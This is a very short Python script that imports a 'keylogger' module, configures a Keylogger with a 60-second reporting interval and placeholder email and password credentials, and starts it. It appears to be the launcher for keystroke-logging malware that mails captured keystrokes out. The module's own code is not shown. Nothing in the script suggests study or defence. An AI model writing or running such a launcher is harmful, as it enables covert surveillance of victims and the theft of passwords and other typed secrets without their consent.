#!/usr/bin/env python

import keylogger

my_keylogger = keylogger.Keylogger(60, "email", "password")
my_keylogger.start()
